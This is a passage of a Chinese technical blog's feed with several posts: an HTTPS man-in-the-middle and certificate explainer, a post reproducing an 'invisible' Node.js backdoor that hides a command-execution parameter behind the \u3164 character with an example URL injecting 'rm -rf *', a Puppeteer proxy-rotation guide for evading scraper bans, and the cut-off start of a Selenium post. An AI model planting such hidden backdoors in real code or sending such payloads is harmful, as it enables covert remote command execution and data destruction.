协议正常情况下是不怕窃听的，也就是说，我即使在你家路由器上面安装一个监控程序，也无法监听到你的数据。但是上面这个流程，无法推导出这个结论：</p><p>如果我在你家的路由器上面安装了一个中间人监控的程序。那么，你的客户端第一次往服务器发送请求的时候，我就知道你要请求哪个网站了，这个时候，我首先假装服务器，让你把请求信息都发给我。然后我再假装客户端，把你的请求信息转发给服务器。服务器的公钥下发下来以后，监控程序保留这个公钥。监控程序自己也有一套公钥、私钥。他把自己的公钥发送给你。你以为这个公钥是服务器的，但实际上它是监控程序的。你用这个公钥加密普通密钥，监控程序能就使用自己的私钥来解密，拿到真正的对称加密的密钥。然后它再把普通密钥用服务器下发的公钥加密，传给服务器。接下来，服务器解密以后，用这个普通密钥加密数据，和它以为的客户端正常通信。</p><p>在这个过程中，客户端和服务器，完全不知道自己都在跟一个中间人进行通信。那么数据就这样轻易被监听了。</p><p>这样一来，HTTPS 的安全性意义在哪里？难道你要给监听的人说：你等一下，等我跟服务器交换完密钥以后，你再来监听？</p><p>使用 HTTPS，应该能保证，只要客户端和服务器是正常的，那么监听程序在中间的任何环节出现，我都不害怕。</p><p>HTTPS 之所以能这样保证，是因为它使用的是<a href="https://zh.wikipedia.org/wiki/X.509" target="_blank" rel="noopener">符合X.509标准的证书</a>，而不仅仅是公钥和私钥。</p><blockquote><p>国际电信联盟设计了一套专门针对证书格式的标准X.509，其核心提供了一种描述证书的格式。</p><p>X.509数字证书不仅包括用户名和密码，而且还包含了与用户有关的其他信息，通过使用证书，CA可以为证书接收者提供一种方法，使他们不仅信任证书主体的公钥，而且还信任有关证书主体的其他信息。</p></blockquote><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-14-40-02.png" alt></p><p>证书本质上就是一个文本文件。但是这个文件里面记录了很多其他信息，包括这个证书是谁颁发的，过期时间等等。</p><p>我们知道，要生成一个 SSL 证书，在 Linux 里面就是一条命令而已，非常简单。但是，国际电信联盟提供了一批值得信任的证书颁发机构，只有使用这些机构颁发的证书，浏览器才认为是安全的，才会出现绿色的锁。否则，如果你使用的不是认证机构颁发的证书，或者干脆你是自己一条命令生成的证书，那么当你访问网站的时候，就会变成下面这样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-15-46.png" alt></p><p>这是因为，浏览器不知道你现在这个网站的证书，是真正服务器就用的自签证书，还是被中间人替换了。所以会给你发报警。如果你确认服务器就是这个自签证书，那么你就可以点<code>高级</code>-<code>继续访问</code>，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-18-10.png" alt></p><p>访问成功以后，浏览器地址栏也会提示你请求不安全：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-21-02.png" alt></p><p>如果你用 requests 请求这个网站，也会报错，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-20-12.png" alt></p><p>我们知道，requests 可以设置参数<code>verify=False</code>来强行访问使用了非认证机构颁发的证书的网站：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-23-28.png" alt></p><p>这里的<code>verify=False</code>，其实就相当于我们在浏览器上面点击了<code>高级</code>-<code>继续访问</code>。</p><p>除此之外，requests 的<code>verify</code>参数，还可以填写成一个文件地址：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-37-10.png" alt></p><p>这里的这个<code>test.cer</code>文件，就是我在使用<code>openssl</code>生成网站自签证书的时候，一并自动生成的。它同时包含了公钥和私钥。它长下面这样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-40-00.png" alt></p><p>我们再来看看 Charles 的根证书：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-15-53-54.png" alt></p><p>他们的格式是一样的。所以，当我们要使用 Charles/Fiddler/MitmProxy 抓HTTPS 的时候，需要信任根证书，实际上就相当于使用<code>requests</code>的时候，把<code>verify=</code>设置为根证书的地址。</p><p>为什么 Charles 的根证书被信任了以后就可以抓包了？为什么requests 指定了根证书以后，访问使用自签证书的 https 网站就不报错了？这是因为，我们现在有办法可以检测数据是否被篡改过。</p><p>现在话又要说回私钥和公钥了。我们都知道，公钥可以对数据进行加密，私钥对数据进行解密。但是实际上，我们还可以用私钥对数据进行“加密”，公钥进行“解密”！注意这里的<code>加密</code>和<code>解密</code>，我打了引号，是因为准确的说，应该叫做用私钥对数据明文的摘要加密得到数字签名，用公钥可以验证这个数字签名是不是自己对应的那个私钥生成的。</p><p>服务器发给客户端的数据，除了客户端索要的数据外，还包括一份经过签名的摘要数据。客户端收到数据以后，用公钥就可以从签名里面解析出客户端需要的数据对应的摘要。客户端再把自己收到的数据使用摘要算法计算出一个摘要，两边一对比，就知道数据有没有被篡改。</p><p>自签证书不能伪装成可信机构签发的证书，就在于证书里面有一段数字签名，可信任机构颁发的证书，这个签名都是唯一的，自签证书如果修改了机构信息，那么新的摘要信息就跟那么这个数字签名解密后的摘要信息不匹配了。于是浏览器就会给你发出警报。</p><p>但当你信任了一个根证书以后，浏览器就不会发送警报了。所以如果你安装了来路不明的证书，那么你的客户端和服务器的通信就可能会被监听。</p><p>如果你看明白这篇文章，那么你应该会知道，如果你想使用 Charles 等等抓包工具，那么，根证书应该是安装到你的客户端。而不是安装到电脑上。例如你想抓手机的数据包，那么你应该把根证书安装到手机上，而不是安装到运行 Charles 的电脑上。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-11-07-17-02-03.png&quot; alt=&quot;香格里拉古镇里面的牛肉火锅&quot;&gt;&lt;/p&gt;
&lt;p&gt;有同学在知识星球和公众号粉丝群里面提到，希望我讲一讲 HTTPS 证书、为什么使用 Charles、Fiddler、MitmProxy 抓 HTTPS 的请求要安装证书、 requests 发送请求的时候，verify 参数除了 False/True 还能填写什么参数。今天我们就这几个问题来做一个简单的介绍。&lt;/p&gt;
    
    </summary>
    
      <category term="知识" scheme="https://www.kingname.info/categories/%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="中间人攻击" scheme="https://www.kingname.info/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    
      <category term="HTTPS" scheme="https://www.kingname.info/tags/HTTPS/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：亲眼所见，也非真实，如何明目张胆架设后门程序</title>
    <link href="https://www.kingname.info/2021/12/23/backdoor-for-review/"/>
    <id>https://www.kingname.info/2021/12/23/backdoor-for-review/</id>
    <published>2021-12-23T02:55:43.000Z</published>
    <updated>2021-12-23T02:59:23.907Z</updated>
    
    <content type="html"><![CDATA[<p>以前有人说，开源项目非常安全，因为谁都可以看到代码，所以不怕里面藏有后门。</p><p>这样的言论显然非常天真，一来，并不会有很多人真的去看源代码；二来，有一些缺陷隐藏得很深，光看源代码看不出来，例如 log4j2；第三，有办法把后门藏在一段非常安全的代码里面，你即使看源代码也看不出哪里有问题。</p><a id="more"></a><p>今天这个案例，是我在网上闲逛(mo yu)的时候偶然发现的，它的做法非常精巧，可以称得上是光明正大开后门。</p><p>案例文章的原始地址是：<a href="https://certitude.consulting/blog/en/invisible-backdoor/" target="_blank" rel="noopener">The Invisible JavaScript Backdoor</a>这篇文章给出了一段看起来非常安全的Node.js 的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"><span class="keyword">const</span> exec = util.promisify(<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/network_health'</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; timeout,ㅤ&#125; = req.query;</span><br><span class="line">    <span class="keyword">const</span> checkCommands = [</span><br><span class="line">        <span class="string">'ping -c 1 google.com'</span>,</span><br><span class="line">        <span class="string">'curl -s http://example.com/'</span>,ㅤ</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> <span class="built_in">Promise</span>.all(checkCommands.map(<span class="function"><span class="params">cmd</span> =&gt;</span> </span><br><span class="line">                cmd &amp;&amp; exec(cmd, &#123; <span class="attr">timeout</span>: +timeout || <span class="number">5</span>_000 &#125;)));</span><br><span class="line">        res.status(<span class="number">200</span>);</span><br><span class="line">        res.send(<span class="string">'ok'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        res.status(<span class="number">500</span>);</span><br><span class="line">        res.send(<span class="string">'failed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure><p>这段代码使用 Express 框架搭建了一个 API 接口，当你调用<code>http://127.0.0.1:8080/network_health</code>的时候，后台会首先<code>ping</code>一下 Google，然后再使用<code>curl</code>访问<code>http://example.com</code>。如果都成功了，那么显然你的网络是正常的，于是给你返回<code>ok</code>。你也可以设置参数<code>timeout=xxx</code>来限定这两个测试必需在多长时间内完成，否则视为网络有问题。</p><p>这个功能简单得不能再简单了，能有什么问题呢？我现在就把代码放到你的面前让你来Review，你能说我的代码有问题？</p><p>但实际上，上面这段代码确实有一个后门，可以让我在部署了这个接口的机器上执行任意命令，包括但不限于下载木马或者<code>rm -rf *</code>。</p><p>这段代码的问题，就出现在图中我画箭头的这两个地方：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-12-22-20-18-10.png" alt></p><p>这两个地方的逗号后面，并不是空格，而是一个看不见的符号：<code>\u3164</code>。我们知道，在 JavaScript 里面，几乎任何非关键字的Unicode 符号都可以用来当做变量名。而<code>\u3164</code>也是一个 Unicode 字符，所以它显然也可以当做变量名。</p><p>我们来看上面代码中，执行命令的地方：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> checkCommands = [</span><br><span class="line">        <span class="string">'ping -c 1 google.com'</span>,</span><br><span class="line">        <span class="string">'curl -s http://example.com/'</span>,ㅤ</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> <span class="built_in">Promise</span>.all(checkCommands.map(<span class="function"><span class="params">cmd</span> =&gt;</span> </span><br><span class="line">                cmd &amp;&amp; exec(cmd, &#123; <span class="attr">timeout</span>: +timeout || <span class="number">5</span>_000 &#125;)));</span><br></pre></td></tr></table></figure><p>这里，Node.js 会调用系统 Shell 执行数组<code>checkCommands</code>中的<code>两条</code>命令。如果我这样写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hide_command = <span class="string">'rm -rf *'</span></span><br><span class="line"><span class="keyword">const</span> checkCommands = [</span><br><span class="line">        <span class="string">'ping -c 1 google.com'</span>,</span><br><span class="line">        <span class="string">'curl -s http://example.com/'</span>,ㅤhide_command</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure><p>那你肯定知道我执行了三条命令，其中第三个命令会删除电脑里面的文件。现在，我把里面的名字<code>hide_command</code>换成<code>\u3164</code>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ㅤ = <span class="string">'rm -rf *'</span></span><br><span class="line"><span class="keyword">const</span> checkCommands = [</span><br><span class="line">        <span class="string">'ping -c 1 google.com'</span>,</span><br><span class="line">        <span class="string">'curl -s http://example.com/'</span>,ㅤ</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure><p>你虽然可能会觉得<code>const ㅤ = &#39;rm -rf *&#39;</code>有点奇怪，但你应该不会怀疑下面的数组有什么问题。因为在你的眼里，这个数组<strong>只有</strong>两条命令，但它实际上有三条命令。</p><p>而这段攻击代码，把<code>const ㅤ = &#39;rm -rf *&#39;</code>这个奇怪的赋值语句也给隐藏到了<code>const { timeout,ㅤ} = req.query;</code>当中。因为在 Express 中，我们可以这样设置 URL 参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;id, name, type&#125; = req.query;</span><br></pre></td></tr></table></figure><p>那么，你在 URL 里面就可以使用这三个参数：<code>http://127.0.0.1:8000/network_health?id=xxx&amp;name=yyy&amp;type=zzz</code>。现在，这段有后门的代码，其实会接收两个参数，分别是<code>timeout</code>和<code>ㅤ</code>，其中后者这个看起来像是空格的就是<code>\u3164</code>，也就是变量名。所以，我可以通过访问 URL：<code>http://127.0.0.1:8000/network_health?timeout=10&amp;ㅤ=rm -rf *</code>。把删除系统文件的命令传入进来。这里可以传入任何 Shell 命令，如果不想删除对方的系统，那么可以通过执行 Shell 下载一个木马程序到对方的电脑上，然后就可以每天远程偷偷监控对方在干什么了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这样的后门真的是防不胜防。我也没有什么好办法能避免被欺骗。例如你在Github 上面看到有人开源了一个基于 Node.js 实现的电商系统，于是你就把它拿来用，搭建出了你自己的在线商城卖点小东西。也许某一天，你会发现你的账目对不上，也许就是因为这个系统里面留有这样的后门？</p><p>只能说最好的办法就是不要运行来历不明的代码，也不要因为代码是开源项目，就盲目觉得它很安全。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以前有人说，开源项目非常安全，因为谁都可以看到代码，所以不怕里面藏有后门。&lt;/p&gt;
&lt;p&gt;这样的言论显然非常天真，一来，并不会有很多人真的去看源代码；二来，有一些缺陷隐藏得很深，光看源代码看不出来，例如 log4j2；第三，有办法把后门藏在一段非常安全的代码里面，你即使看源代码也看不出哪里有问题。&lt;/p&gt;
    
    </summary>
    
      <category term="JavaScript" scheme="https://www.kingname.info/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="https://www.kingname.info/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：Puppeteer 不重启如何更换代理 IP</title>
    <link href="https://www.kingname.info/2021/12/23/puppeteer-change-proxy/"/>
    <id>https://www.kingname.info/2021/12/23/puppeteer-change-proxy/</id>
    <published>2021-12-23T02:55:22.000Z</published>
    <updated>2021-12-23T02:58:32.889Z</updated>
    
    <content type="html"><![CDATA[<p>我们知道，在写爬虫的过程中，如果总是使用同一个 IP，很容易就会被网站识别并封禁，所以需要使用代理 IP 并经常更换。</p><a id="more"></a><p>但如果你在网上搜索 Puppeteer 如何更换代理 IP，你会发现，网上的解决方案一般是这样写的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer'</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span>() =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123;</span><br><span class="line">    args: [ <span class="string">'--proxy-server=123.45.67.89:8888'</span> ]</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">  <span class="keyword">await</span> page.goto(<span class="string">'http://httpbin.org/ip'</span>);</span><br><span class="line">  <span class="keyword">await</span> browser.close();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>这种写法有一个问题，如果你要更换 IP，必须重启爬虫。那么有没有办法不重启爬虫也能更换代理 IP 呢？</p><p>方法有，并且有两个。</p><h2 id="隧道代理"><a href="#隧道代理" class="headerlink" title="隧道代理"></a>隧道代理</h2><p>对一些网站来说，只要每次访问的 IP 不一样就可以避免被封禁，那么我们可以使用隧道代理。隧道代理供应商会给我们提供一个唯一的域名和端口。我们把它设置为爬虫的代理就可以了。代理供应商会在后端自动给每一次请求更换 IP，不用我们来操心。</p><p>我们使用<a href="https://www.qg.net/business/proxyip/42.html" target="_blank" rel="noopener">青果云</a>的隧道代理来做演示。它可以免费试用2小时。我获取到的代理 IP 地址为：<code>http://D5A913AF:B1DE2C46D321@tunnel.qg.net:11151</code>。于是，我可以修改上面的 Puppeteer 代码中的 IP 地址：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer-core'</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span>() =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123;</span><br><span class="line">    args: [ <span class="string">'--proxy-server=tunnel.qg.net:11151'</span> ], <span class="attr">headless</span>: <span class="literal">false</span>, <span class="attr">executablePath</span>: <span class="string">'/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge'</span>&#125;);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">  <span class="keyword">await</span> page.authenticate(&#123;<span class="attr">username</span>: <span class="string">'账号'</span>, <span class="attr">password</span>: <span class="string">'密码'</span>&#125;);  <span class="comment">// 如果代理没有权限验证，可以移除这一行</span></span><br><span class="line">  response = <span class="keyword">await</span> page.goto(<span class="string">'http://httpbin.org/ip'</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'第一次访问: '</span>, <span class="keyword">await</span> response.text());</span><br><span class="line">  response = <span class="keyword">await</span> page.goto(<span class="string">'http://httpbin.org/ip'</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'第二次访问: '</span>, <span class="keyword">await</span> response.text());</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-12-19-11-05-57.png" alt></p><h2 id="动态按需修改代理-IP"><a href="#动态按需修改代理-IP" class="headerlink" title="动态按需修改代理 IP"></a>动态按需修改代理 IP</h2><p>IP 并不是换得越频繁越好。如果网站需要登录，那么你登录以后每一次请求都更换 IP，这反而会弄巧成拙，让网站更加怀疑你是不是爬虫。还有一些网站，例如淘宝，当你访问一个页面的时候，它会自动301跳转多次。在这几次跳转的时候，你必须保持 IP 一致，否则它就会屏蔽你。</p><p>我们有时候需要实现按需更换代理 IP——让开发者在需要更换 IP 的时候，再来更换。</p><p>为了让 Puppeteer 实现这个目标，我们可以安装一个第三方模块：<code>puppeteer-page-proxy</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i puppeteer-page-proxy</span><br></pre></td></tr></table></figure><p>安装完成以后，我们来使用看看：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer-core'</span>)</span><br><span class="line"><span class="keyword">const</span> useProxy = <span class="built_in">require</span>(<span class="string">'puppeteer-page-proxy'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puppeteer.launch(&#123;<span class="attr">headless</span>: <span class="literal">false</span>, <span class="attr">executablePath</span>: <span class="string">'/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge'</span>&#125;).then(</span><br><span class="line">    <span class="keyword">async</span> browser =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'start...'</span>)</span><br><span class="line">        <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> useProxy(page, <span class="string">'http://账号:密码@119.5.228.105:21477'</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'change proxy success, start to visit url'</span>)</span><br><span class="line">        resp = <span class="keyword">await</span> page.goto(<span class="string">'http://httpbin.org/ip'</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">await</span> resp.text())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> useProxy(page, <span class="string">'http://账号:密码@119.41.199.19:56214'</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'change proxy success, start to visit url'</span>)</span><br><span class="line">        resp = <span class="keyword">await</span> page.goto(<span class="string">'http://httpbin.org/ip'</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">await</span> resp.text())</span><br><span class="line">        &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-12-19-11-22-37.png" alt></p><p>当我们需要更换 IP 的时候，只需要在代码里面执行<code>await useProxy(page, &#39;http://账号:密码@IP:端口&#39;)</code>，就可以更换新的 IP 了。如果你的代理 IP 没有账号密码，那么可以把代码改成：<code>await useProxy(page, &#39;http://IP:端口&#39;)</code>。</p><p>可能有人会问，你上面的示例代码中，你是直接把代理填写到代码里面的。如果我需要访问某个 URL 来获取新的代理怎么办呢？其实这也很简单，你可以再安装一个第三方模块：<code>axios</code>用来发起网络请求获取新的代理 IP，然后再替换:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i axios</span><br></pre></td></tr></table></figure><p>还是以青果云的短效代理 IP 为例，它可以提供一个接口，访问接口后，你能得到一个有效期5-15分钟的短效 IP，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-12-19-11-29-14.png" alt></p><p>开通试用账号以后，你可以获得一个提取代理的 URL，类似于下面这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://proxy.qg.net/extract?Key=ABCDEFGH&amp;Num=1&amp;AreaId=&amp;Isp=&amp;DataFormat=txt&amp;DataSeparator=%5Cn&amp;Detail=0</span><br></pre></td></tr></table></figure><p>访问以后就能拿到代理IP，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-12-19-11-34-37.png" alt></p><p>现在，我们要在 Puppeteer 里面，先访问这个 URL 获取代理，再把代理IP 设置到 Puppeteer 中，然后再访问目标网页。对应的代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer-extra'</span>)</span><br><span class="line"><span class="keyword">const</span> useProxy = <span class="built_in">require</span>(<span class="string">'puppeteer-page-proxy'</span>)</span><br><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">set_proxy</span>(<span class="params">page</span>)</span>&#123;</span><br><span class="line">    resp = <span class="keyword">await</span> axios.get(<span class="string">'https://proxy.qg.net/extract?Key=ABCDEFG&amp;Num=1&amp;AreaId=&amp;Isp=&amp;DataFormat=txt&amp;DataSeparator=%5Cn&amp;Detail=0'</span>)</span><br><span class="line">    proxy = <span class="string">'http://账号:密码@'</span> + resp.data</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'获取到的代理 IP 为：'</span>, proxy)</span><br><span class="line">    <span class="keyword">await</span> useProxy(page, proxy)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">puppeteer.launch(&#123;<span class="attr">headless</span>: <span class="literal">false</span>, <span class="attr">executablePath</span>: <span class="string">'/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge'</span>&#125;).then(</span><br><span class="line">    <span class="keyword">async</span> browser =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'start...'</span>)</span><br><span class="line">        <span class="keyword">const</span> [page] = <span class="keyword">await</span> browser.pages()</span><br><span class="line">        <span class="keyword">await</span> set_proxy(page)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'change proxy success, start to visit url'</span>)</span><br><span class="line">        resp = <span class="keyword">await</span> page.goto(<span class="string">'http://httpbin.org/ip'</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">await</span> resp.text())</span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-12-19-11-49-40.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们知道，在写爬虫的过程中，如果总是使用同一个 IP，很容易就会被网站识别并封禁，所以需要使用代理 IP 并经常更换。&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="Puppeteer" scheme="https://www.kingname.info/tags/Puppeteer/"/>
    
      <category term="代理" scheme="https://www.kingname.info/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：Selenium如何接管已经运行的Chrome浏览器？</title>
    <link href="https://www.kingname.info/2021/12/23/remote-debug-selenium/"/>
    <id>https://www.kingname.info/2021/12/23/remote-debug-selenium/</id>
    <published>2021-12-23T02:55:10.000Z</published>
    <updated>2021-12-23T02:57:30.636Z</updated>
    
    <content type="html"><![CDATA[<p>在昨天的文章<a href="https://mp.weixin.qq.com/s/ZifW2YtB_G2hmf_Es0BAgw" target="_blank" rel="noopener">一日一技：爬虫模拟浏览器如何避免重复登录？</a>中，我讲到了如何使用Puppeteer接管已经运行的Chrome。今天我们来讲讲使用Selenium如何实现这个功能。</p><a id="more"></a><p>在正式开始之前，先纠正昨天的一个错误。昨天我讲到，Windows电脑启动Chrome的远程调试模式用到的命令是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件路径/chrome.exe --remote-debugging-port=9222</span><br></pre></td></tr></table></figure><p>这个地方漏掉了一个参数。正确的命令应该是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件路径/chrome.exe --remote-debugging-port=9222 --user-data-dir=<span class="string">"某个存在的文件夹地址"</span></span><br></pre></td></tr></table></figure><p>好了，回到正题。现在无论你使用macOS还是Windows，首先按昨天的文章所说，启动Chrome开放9222端口。然后，在这个Chrome中，手动登录示例网站。</p><p>接下来，编写下面这段代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> Chrome</span><br><span class="line"><span class="keyword">from</span> 